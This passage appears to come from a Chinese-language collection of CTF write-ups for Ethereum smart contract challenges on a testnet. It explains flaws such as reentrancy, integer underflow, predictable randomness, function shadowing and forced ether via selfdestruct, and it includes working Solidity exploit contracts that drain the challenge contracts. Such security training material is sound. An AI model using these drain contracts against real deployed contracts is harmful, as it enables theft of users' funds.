\u53e6\u5916\u8fd8\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u4e00\u4e0b\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 ctf_challenge_add_authorized_sender \u51fd\u6570\u9884\u5148\u628a\u8981\u90e8\u7f72\u7684\u653b\u51fb\u5408\u7ea6\u7684\u4f4d\u7f6e\u52a0\u5165\u767d\u540d\u5355\u540e\u624d\u53ef\u4ee5\u90e8\u7f72\u653b\u51fb\u5408\u7ea6 exp contract Attacker { Scratchcard challenge ; uint public count ; uint public money ; constructor ( address addr , address player ) public payable { challenge = Scratchcard ( addr ); count = 0 ; while ( count < 25 ) { money = ( now % 10 ** 8 ) * 10 ** 10 ; challenge . play . value ( money )(); count += 1 ; } challenge . collectMegaJackpot ( addr . balance ); selfdestruct ( player ); } function () public payable {} } contract Exploit { Scratchcard challenge ; address player ; uint8 public nonce ; constructor ( address addr , address _player ) public { challenge = Scratchcard ( addr ); player = _player ; nonce = 1 ; } function exp () public payable { address attacker = address ( keccak256 ( 0xd6 , 0x94 , this , nonce )); nonce += 1 ; challenge . ctf_challenge_add_authorized_sender ( attacker ); address ( attacker ). transfer ( 4 ether ); Attacker newAttacker = new Attacker ( address ( challenge ), player ); } function () public payable {} function destroy () public { selfdestruct ( player ); } }","title":"Security Innovation"},{"location":"writeups/SecurityInnovation/#security-innovation-smart-contract-ctf-writeups","text":"Abstract https://blockchain-ctf.securityinnovation.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Ropsten \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.metamask.io/ \u641e\u70b9\u6d4b\u8bd5\u5e01 \u5728\u7f51\u7ad9\u4e0a\u8fde\u63a5 MetaMask\u3001\u90e8\u7f72\u9898\u76ee","title":"Security Innovation Smart Contract CTF Writeups"},{"location":"writeups/SecurityInnovation/#donation","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Donation is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawDonationsFromTheSuckersWhoFellForIt () external ctf { msg.sender . transfer ( funds ); funds = 0 ; } \u76ee\u7684\u662f\u628a\u5408\u7ea6\u8d26\u6237\u641e\u6ca1\u94b1\uff0c\u6240\u4ee5\u5728 Remix \u4e2d\u7f16\u8bd1\u4e0b\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u9898\u76ee\u90e8\u7f72\u7684\u5408\u7ea6\u5730\u5740\u8f7d\u5165\u5408\u7ea6\uff0c\u518d\u8c03\u7528 withdrawDonationsFromTheSuckersWhoFellForIt \u51fd\u6570\u5373\u53ef","title":"Donation"},{"location":"writeups/SecurityInnovation/#lock-box","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Lockbox1 is CtfFramework { uint256 private pin ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { pin = now % 10000 ; } function unlock ( uint256 _pin ) external ctf { require ( pin == _pin , \"Incorrect PIN\" ); msg.sender . transfer ( address ( this ). balance ); } } \u53ef\u4ee5\u53d1\u73b0\uff0c\u9700\u8981\u8c03\u7528 unlock \u51fd\u6570\uff0c\u5b83\u9700\u8981\u63a5\u6536\u4e00\u4e2a\u6b63\u786e\u7684 pin\uff0c\u8fd9\u4e2a pin \u662f\u4ece\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u95f4\u6233\u8ba1\u7b97\u6765\u7684\uff0c\u53ef\u4ee5\u5728\u94fe\u4e0a\u627e\u5230\u90e8\u7f72\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 web3 \u8bfb\u53d6\u5408\u7ea6 pin \u4f4d\u7f6e\u7684 storage \u4ece\u800c\u770b\u5230 pin \u5185\u5bb9\uff1a > await web3 . eth . getStorageAt ( \"0x56e06639308e17fd9d948ebaea5b2e4b4beef06e\" , 1 , ( x , y )=>{ console . log ( y );}) 0x0000000000000000000000000000000000000000000000000000000000000f73 \u7136\u540e\u540c\u6837\u5728 Remix \u4e0a\u7f16\u8bd1\u3001\u8f7d\u5165\u518d\u8c03\u7528 unlock \u51fd\u6570\u8f93\u5165\u6b63\u786e\u7684 pin \u5373\u53ef","title":"Lock Box"},{"location":"writeups/SecurityInnovation/#piggy-bank","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract PiggyBank is CtfFramework { using SafeMath for uint256 ; uint256 public piggyBalance ; string public name ; address public owner ; constructor ( address _ctfLauncher , address _player , string _name ) public payable CtfFramework ( _ctfLauncher , _player ) { name = _name ; owner = msg.sender ; piggyBalance = piggyBalance . add ( msg.value ); } function () external payable ctf { piggyBalance = piggyBalance . add ( msg.value ); } modifier onlyOwner (){ require ( msg.sender == owner , \"Unauthorized: Not Owner\" ); _ ; } function withdraw ( uint256 amount ) internal { piggyBalance = piggyBalance . sub ( amount ); msg.sender . transfer ( amount ); } function collectFunds ( uint256 amount ) public onlyOwner ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdraw ( amount ); } } contract CharliesPiggyBank is PiggyBank { uint256 public withdrawlCount ; constructor ( address _ctfLauncher , address _player ) public payable PiggyBank ( _ctfLauncher , _player , \"Charlie\" ) { withdrawlCount = 0 ; } function collectFunds ( uint256 amount ) public ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdrawlCount = withdrawlCount . add ( 1 ); withdraw ( amount ); } } withdraw \u662f internal\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0ccollectFunds \u662f public \u53ef\u4ee5\u8c03\u7528 \u867d\u7136\u5728 PiggyBank \u5408\u7ea6\u4e2d\u52a0\u4e86 onlyOwner \u8fd9\u4e2a modifier\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u90e8\u7f72\u7684 CharliesPiggyBank \u5408\u7ea6\u91cd\u8f7d\u4e86\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u5e26 modifier\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 collectFunds \u6765 withdraw \u9898\u76ee\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u94b1","title":"Piggy Bank"},{"location":"writeups/SecurityInnovation/#si-token-sale","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; // https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol import \"../StandardToken.sol\" ; contract SIToken is StandardToken { using SafeMath for uint256 ; string public name = \"SIToken\" ; string public symbol = \"SIT\" ; uint public decimals = 18 ; uint public INITIAL_SUPPLY = 1000 * ( 10 ** decimals ); constructor () public { totalSupply_ = INITIAL_SUPPLY ; balances [ this ] = INITIAL_SUPPLY ; } } contract SITokenSale is SIToken , CtfFramework { uint256 public feeAmount ; uint256 public etherCollection ; address public developer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { feeAmount = 10 szabo ; developer = msg.sender ; purchaseTokens ( msg.value ); } function purchaseTokens ( uint256 _value ) internal { require ( _value > 0 , \"Cannot Purchase Zero Tokens\" ); require ( _value < balances [ this ], \"Not Enough Tokens Available\" ); balances [ msg.sender ] += _value - feeAmount ; balances [ this ] -= _value ; balances [ developer ] += feeAmount ; etherCollection += msg.value ; } function () payable external ctf { purchaseTokens ( msg.value ); } // Allow users to refund their tokens for half price ;-) function refundTokens ( uint256 _value ) external ctf { require ( _value > 0 , \"Cannot Refund Zero Tokens\" ); transfer ( this , _value ); etherCollection -= _value / 2 ; msg.sender . transfer ( _value / 2 ); } function withdrawEther () external ctf { require ( msg.sender == developer , \"Unauthorized: Not Developer\" ); require ( balances [ this ] == 0 , \"Only Allowed Once Sale is Complete\" ); msg.sender . transfer ( etherCollection ); } } \u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4f59\u989d\uff0c\u4f46\u662f\u6700\u591a\u53ea\u80fd\u8f6c\u51fa balances \u7684\u4e00\u534a\uff0c\u6240\u4ee5\u8981\u5148\u63d0\u9ad8\u81ea\u5df1\u7684\u4ee3\u5e01\u4f59\u989d\u3002\u4e0d\u96be\u53d1\u73b0 purchaseTokens \u51fd\u6570\u4e2d\u5b58\u5728\u4e0b\u6ea2\uff1a balances [ msg.sender ] += _value - feeAmount ; \u53ea\u8981\u4f20\u5165\u7684 _value \u5c0f\u4e8e feeAmount \u5c31\u53ef\u4ee5\u4f7f balances \u4e0b\u6ea2\u3002\u867d\u7136 purchaseTokens \u51fd\u6570\u662f internal \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f fallback \u51fd\u6570\u4e2d\u76f4\u63a5\u5c06 msg.value \u4f5c\u4e3a _value \u8c03\u7528\u4e86 purchaseTokens \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5148\u76f4\u63a5\u5411\u5408\u7ea6\u8d26\u6237\u8f6c 1Wei\uff0c\u5373\u53ef\u901a\u8fc7 fallback \u89e6\u53d1\u4e0b\u6ea2 \u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4e86\u3002\u53ef\u4ee5\u5148\u8c03\u7528 etherCollection \u770b\u4e00\u4e0b\u9700\u8981\u8f6c\u51fa\u7684\u91d1\u989d\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521d\u59cb + 1Wei \u7684\u65b9\u5f0f\u8ba1\u7b97\uff09\uff0c\u518d\u4e58\u4ee5\u4e8c\u5c31\u662f\u8981\u4f20\u7ed9 refundTokens \u7684\u53c2\u6570\u4e86","title":"SI Token Sale"},{"location":"writeups/SecurityInnovation/#secure-bank","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract SimpleBank is CtfFramework { mapping ( address => uint256 ) public balances ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { balances [ msg.sender ] = msg.value ; } function deposit ( address _user ) public payable ctf { balances [ _user ] += msg.value ; } function withdraw ( address _user , uint256 _value ) public ctf { require ( _value <= balances [ _user ], \"Insufficient Balance\" ); balances [ _user ] -= _value ; msg.sender . transfer ( _value ); } function () public payable ctf { deposit ( msg.sender ); } } contract MembersBank is SimpleBank { mapping ( address => string ) public members ; constructor ( address _ctfLauncher , address _player ) public payable SimpleBank ( _ctfLauncher , _player ) { } function register ( address _user , string _username ) public ctf { members [ _user ] = _username ; } modifier isMember ( address _user ){ bytes memory username = bytes ( members [ _user ]); require ( username . length != 0 , \"Member Must First Register\" ); _ ; } function deposit ( address _user ) public payable isMember ( _user ) ctf { super . deposit ( _user ); } function withdraw ( address _user , uint256 _value ) public isMember ( _user ) ctf { super . withdraw ( _user , _value ); } } contract SecureBank is MembersBank { constructor ( address _ctfLauncher , address _player ) public payable MembersBank ( _ctfLauncher , _player ) { } function deposit ( address _user ) public payable ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( msg.value < 100 ether , \"Exceeding Account Limits\" ); require ( msg.value >= 1 ether , \"Does Not Satisfy Minimum Requirement\" ); super . deposit ( _user ); } function withdraw ( address _user , uint8 _value ) public ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( _value < 100 , \"Exceeding Account Limits\" ); require ( _value >= 1 , \"Does Not Satisfy Minimum Requirement\" ); super . withdraw ( _user , _value * 1 ether ); } function register ( address _user , string _username ) public ctf { require ( bytes ( _username ). length != 0 , \"Username Not Enough Characters\" ); require ( bytes ( _username ). length <= 20 , \"Username Too Many Characters\" ); super . register ( _user , _username ); } } \u5408\u7ea6\u6709\u70b9\u957f\uff0c\u6709\u4e09\u4e2a\u5408\u7ea6 SimpleBank\u3001MembersBank \u548c SecureBank\uff0c\u662f\u9010\u4e2a\u7ee7\u627f\u7684\u5173\u7cfb \u901a\u8fc7 SimpleBank \u7684 constructor \u53ef\u4ee5\u770b\u51fa\uff0c\u6240\u6709\u94b1\u90fd\u8f6c\u7ed9\u4e86\u9898\u76ee\u5408\u7ea6\u7684\u521b\u5efa\u8005\uff0c\u800c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff0c\u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8c03\u7528 withdraw \u51fd\u6570\u6765\u501f\u52a9\u521b\u5efa\u8005\u7684\u5730\u5740\u8f6c\u51fa\u5408\u7ea6\u4e2d\u7684\u94b1 \u800c withdraw \u5b58\u5728\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a SecureBank \u4e2d\u7684 withdraw \u68c0\u67e5\u4e86\u4f20\u5165\u7684 _user \u662f\u5426\u662f msg.sender\uff0c\u4e0d\u80fd\u4ece\u4e2d\u9020\u5047 SecureBank \u7684 withdraw \u7684 _value \u53c2\u6570\u662f uint8 \u7c7b\u578b\uff0c\u800c MembersBank \u4e2d withdraw \u7684\u53c2\u6570\u662f uint256 \u7c7b\u578b\uff0c\u8fd9\u5bfc\u81f4\u4e86\u8fd9\u4e24\u4e2a\u51fd\u6570\u5e76\u4e0d\u662f\u91cd\u8f7d\u5173\u7cfb\uff0c\u800c\u662f\u4e24\u4e2a\u51fd\u6570 \u6240\u4ee5\u73b0\u5728\u7684\u76ee\u6807\u662f\u8c03\u7528 MembersBank \u7684 withdraw \u51fd\u6570\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u5e26\u6709\u4e00\u4e2a isMember(_user) \u7684 modifier\uff0c\u6240\u4ee5\u5148\u8981\u7ed9\u521b\u5efa\u8005\u7684\u5730\u5740 register \u4e00\u4e0b\uff0c\u7136\u540e\u518d\u8c03\u7528 withdraw(address, uint256) \u8f6c\u51fa\u6240\u6709\u4f59\u989d\u5373\u53ef","title":"Secure Bank"},{"location":"writeups/SecurityInnovation/#lottery","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Lottery is CtfFramework { using SafeMath for uint256 ; uint256 public totalPot ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { totalPot = totalPot . add ( msg.value ); } function () external payable ctf { totalPot = totalPot . add ( msg.value ); } function play ( uint256 _seed ) external payable ctf { require ( msg.value >= 1 finney , \"Insufficient Transaction Value\" ); totalPot = totalPot . add ( msg.value ); bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( msg.sender )); bytes32 target = keccak256 ( abi . encodePacked ( entropy ^ entropy2 )); bytes32 guess = keccak256 ( abi . encodePacked ( _seed )); if ( guess == target ){ //winner uint256 payout = totalPot ; totalPot = 0 ; msg.sender . transfer ( payout ); } } } \u9884\u6d4b\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u7136\u540e\u6839\u636e play \u91cc\u7684\u903b\u8f91\u751f\u6210 target\uff0c\u7136\u540e\u4f20\u7ed9 play \u5373\u53ef \u9700\u8981\u6ce8\u610f\u7684\u662f\u8981\u652f\u4ed8 1 finney \u4f5c\u4e3a value\uff0c\u5e76\u4e14\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8981\u5148\u8c03\u7528\u4e00\u4e0b Lottery \u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\uff08\u6765\u81ea CtfFramework\uff09\u5c06\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355 exp contract Exploit { Lottery challenge ; constructor ( address addr ) public { challenge = Lottery ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( this )); uint256 ans = uint256 ( entropy ^ entropy2 ); challenge . play . value ( msg.value )( ans ); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Lottery"},{"location":"writeups/SecurityInnovation/#heads-or-tails","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract HeadsOrTails is CtfFramework { using SafeMath for uint256 ; uint256 public gameFunds ; uint256 public cost ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { gameFunds = gameFunds . add ( msg.value ); cost = gameFunds . div ( 10 ); } function play ( bool _heads ) external payable ctf { require ( msg.value == cost , \"Incorrect Transaction Value\" ); require ( gameFunds >= cost . div ( 2 ), \"Insufficient Funds in Game Contract\" ); bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; if (( coinFlip == 1 && _heads ) || ( coinFlip == 0 && ! _heads )) { //win gameFunds = gameFunds . sub ( msg.value . div ( 2 )); msg.sender . transfer ( msg.value . mul ( 3 ). div ( 2 )); } else { //loser gameFunds = gameFunds . add ( msg.value ); } } } \u540c\u6837\u662f\u8ba1\u7b97\u4f2a\u968f\u673a\u6570\uff0c\u6bcf\u6b21 play \u9700\u8981 0.1 ether\uff0c\u5e76\u4e14\u4ece\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u8f6c\u51fa 0.05 ether \u4f5c\u4e3a\u5956\u52b1\u3002\u56e0\u6b64\u9700\u8981\u8c03\u7528 20 \u6b21 play \u6765\u8f6c\u51fa\u8d26\u6237\u4e2d\u7684 2 ether \u540c\u6837\u9700\u8981\u5728\u90e8\u7f72\u5408\u7ea6\u540e\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\u6765\u5c06\u653b\u51fb\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355\u3002\u5e76\u4e14\u505a\u5b8c\u4e4b\u540e selfdestruct \u6765\u8f6c\u56de\u653b\u51fb\u5408\u7ea6\u4e2d\u7684 3 ether \u4f1a\u6bd4\u8f83\u597d exp contract Exploit { HeadsOrTails challenge ; constructor ( address addr ) public { challenge = HeadsOrTails ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; for ( int i = 0 ; i < 20 ; i ++ ) { if ( coinFlip == 1 ) { challenge . play . value ( 0 . 1 ether )( true ); } else { challenge . play . value ( 0 . 1 ether )( false ); } } } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Heads or Tails"},{"location":"writeups/SecurityInnovation/#trust-fund","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract TrustFund is CtfFramework { using SafeMath for uint256 ; uint256 public allowancePerYear ; uint256 public startDate ; uint256 public numberOfWithdrawls ; bool public withdrewThisYear ; address public custodian ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { custodian = msg.sender ; allowancePerYear = msg.value . div ( 10 ); startDate = now ; } function checkIfYearHasPassed () internal { if ( now >= startDate + numberOfWithdrawls * 365 days ){ withdrewThisYear = false ; } } function withdraw () external ctf { require ( allowancePerYear > 0 , \"No Allowances Allowed\" ); checkIfYearHasPassed (); require ( ! withdrewThisYear , \"Already Withdrew This Year\" ); if ( msg.sender . call . value ( allowancePerYear )()){ withdrewThisYear = true ; numberOfWithdrawls = numberOfWithdrawls . add ( 1 ); } } function returnFunds () external payable ctf { require ( msg.value == allowancePerYear , \"Incorrect Transaction Value\" ); require ( withdrewThisYear == true , \"Cannot Return Funds Before Withdraw\" ); withdrewThisYear = false ; numberOfWithdrawls = numberOfWithdrawls . sub ( 1 ); } } \u91cd\u5165\u653b\u51fb\uff0c\u5199\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u5176 fallback \u4e2d\u518d\u6b21\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\uff0c\u6ce8\u610f\u8981\u5728 MetaMask \u53d1\u9001\u4ea4\u6613\u65f6\u63d0\u9ad8\u4e00\u4e0b gas\uff0c\u4e0d\u7136\u5185\u90e8\u7684\u4ea4\u6613\u4f1a\u51fa\u73b0 gas \u4e0d\u8db3\u7684\u95ee\u9898 exp contract Exploit { TrustFund challenge ; constructor ( address addr ) public { challenge = TrustFund ( addr ); } function exp () public { challenge . withdraw (); } function () public payable { challenge . withdraw (); } function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Trust Fund"},{"location":"writeups/SecurityInnovation/#record-label","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Royalties { using SafeMath for uint256 ; address private collectionsContract ; address private artist ; address [] private receiver ; mapping ( address => uint256 ) private receiverToPercentOfProfit ; uint256 private percentRemaining ; uint256 public amountPaid ; constructor ( address _manager , address _artist ) public { collectionsContract = msg.sender ; artist = _artist ; receiver . push ( _manager ); receiverToPercentOfProfit [ _manager ] = 80 ; percentRemaining = 100 - receiverToPercentOfProfit [ _manager ]; } modifier isCollectionsContract () { require ( msg.sender == collectionsContract , \"Unauthorized: Not Collections Contract\" ); _ ; } modifier isArtist (){ require ( msg.sender == artist , \"Unauthorized: Not Artist\" ); _ ; } function addRoyaltyReceiver ( address _receiver , uint256 _percent ) external isArtist { require ( _percent < percentRemaining , \"Precent Requested Must Be Less Than Percent Remaining\" ); receiver . push ( _receiver ); receiverToPercentOfProfit [ _receiver ] = _percent ; percentRemaining = percentRemaining . sub ( _percent ); } function payoutRoyalties () public payable isCollectionsContract { for ( uint256 i = 0 ; i < receiver . length ; i ++ ){ address current = receiver [ i ]; uint256 payout = msg.value . mul ( receiverToPercentOfProfit [ current ]). div ( 100 ); amountPaid = amountPaid . add ( payout ); current . transfer ( payout ); } msg.sender . call . value ( msg.value - amountPaid )( bytes4 ( keccak256 ( \"collectRemainingFunds()\" ))); } function getLastPayoutAmountAndReset () external isCollectionsContract returns ( uint256 ){ uint256 ret = amountPaid ; amountPaid = 0 ; return ret ; } function () public payable isCollectionsContract { payoutRoyalties (); } } contract Manager { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function withdraw ( uint256 _balance ) public { owner . transfer ( _balance ); } function () public payable { // empty } } contract RecordLabel is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; address public royalties ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { royalties = new Royalties ( new Manager ( _ctfLauncher ), _player ); funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawFundsAndPayRoyalties ( uint256 _withdrawAmount ) external ctf { require ( _withdrawAmount <= funds , \"Insufficient Funds in Contract\" ); funds = funds . sub ( _withdrawAmount ); royalties . call . value ( _withdrawAmount )(); uint256 royaltiesPaid = Royalties ( royalties ). getLastPayoutAmountAndReset (); uint256 artistPayout = _withdrawAmount . sub ( royaltiesPaid ); msg.sender . transfer ( artistPayout ); } function collectRemainingFunds () external payable { require ( msg.sender == royalties , \"Unauthorized: Not Royalties Contract\" ); } } \u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\uff0c\u4f46\u662f\u5927\u81f4\u770b\u4e00\u4e0b\u7684\u8bdd\u5c31\u53ef\u4ee5\u770b\u51fa\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u7684\u65f6\u5019\u4f1a\u628a\u5168\u90e8\u7684 _withdrawAmount \u5168\u90e8\u4f20\u7ed9 Royalties\uff0c\u5176\u4e2d\u4f1a\u5c06 80% \u4f20\u7ed9\u6211\u4eec\uff0c\u518d\u628a 20% \u4f20\u56de\u53bb\uff0c\u800c\u8fd9 20% \u53c8\u4f1a\u5728 withdrawFundsAndPayRoyalties \u4e2d\u518d\u4f20\u7ed9\u6211\u4eec\u3002\u6240\u4ee5\u53ea\u9700\u8981\u76f4\u63a5\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u5c06 1 ether \u63d0\u53d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86","title":"Record Label"},{"location":"writeups/SecurityInnovation/#slot-machine","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract SlotMachine is CtfFramework { using SafeMath for uint256 ; uint256 public winner ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { winner = 5 ether ; } function () external payable ctf { require ( msg.value == 1 szabo , \"Incorrect Transaction Value\" ); if ( address ( this ). balance >= winner ){ msg.sender . transfer ( address ( this ). balance ); } } } \u76ee\u6807\u662f\u8ba9\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u7684\u4f59\u989d\u4e0d\u5c11\u4e8e 5 ether\uff0c\u800c\u4e14\u5408\u7ea6\u4e2d\u7684 fallback \u51fd\u6570\u53ea\u63a5\u6536 1 szabo \u4f46\u662f\u5982\u679c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5269\u4f59\u4f59\u989d\u5168\u90e8\u8f6c\u79fb\u5230\u9898\u76ee\u5408\u7ea6\u4e0a\u7684\u8bdd\u662f\u4e0d\u4f1a\u7ecf\u8fc7 fallback \u51fd\u6570\u7684\uff0c\u6240\u4ee5\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u8f6c\u5165\u4e0d\u5c11\u4e8e 3.5 ether \u7136\u540e\u518d selfdestruct \u5c31\u53ef\u4ee5\u4e86 exp contract Exploit { address challenge ; constructor ( address addr ) public payable { challenge = addr ; } function exp () public { selfdestruct ( challenge ); } }","title":"Slot Machine"},{"location":"writeups/SecurityInnovation/#rainy-day-fund","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract DebugAuthorizer { bool public debugMode ; constructor () public payable { if ( address ( this ). balance == 1 . 337 ether ){ debugMode = true ; } } } contract RainyDayFund is CtfFramework { address public developer ; mapping ( address => bool ) public fundManagerEnabled ; DebugAuthorizer public debugAuthorizer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development debugAuthorizer = new DebugAuthorizer (); developer = msg.sender ; fundManagerEnabled [ msg.sender ] = true ; } modifier isManager () { require ( fundManagerEnabled [ msg.sender ] || debugAuthorizer . debugMode () || msg.sender == developer , \"Unauthorized: Not a Fund Manager\" ); _ ; } function () external payable ctf { // Anyone can add to the fund } function addFundManager ( address _newManager ) external isManager ctf { fundManagerEnabled [ _newManager ] = true ; } function removeFundManager ( address _previousManager ) external isManager ctf { fundManagerEnabled [ _previousManager ] = false ; } function withdraw () external isManager ctf { msg.sender . transfer ( address ( this ). balance ); } } \u8f6c\u51fa\u6240\u6709\u94b1\u7684\u8bdd\u8981\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u5b83\u5e26\u6709 isManager \u8fd9\u4e2a modifier\uff0c\u800c manager \u6211\u4eec\u6539\u4e0d\u4e86\uff0c\u6240\u4ee5\u601d\u8def\u5728\u4e8e\u5f00\u542f debug mode \u4f46\u662f\u9898\u76ee\u7684 constructor \u4e2d\u4f1a\u521b\u5efa DebugAuthorizer \u5408\u7ea6\u5b9e\u4f8b\u800c\u4e14\u5e76\u4e0d\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u6253\u5f00 debug mode\uff0c\u540e\u7eed\u518d\u5411\u5176\u4e2d\u8f6c\u8d26\u7684\u8bdd\u4e5f\u4e0d\u4f1a\u6253\u5f00 debug mode\uff08\u56e0\u4e3a\u8fd9\u4e2a\u662f\u5728 constructor \u4e2d\u8d4b\u503c\u7684\uff09 \u6240\u4ee5\u5c31\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6b21 developer \u90e8\u7f72\u7684\u9898\u76ee\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u63d0\u524d\u8ba1\u7b97\u51fa\u5176\u521b\u5efa\u7684 DebugAuthorizer \u7684\u5730\u5740\uff0c\u5148\u5411\u5176\u4e2d\u8f6c\u5165 1.337 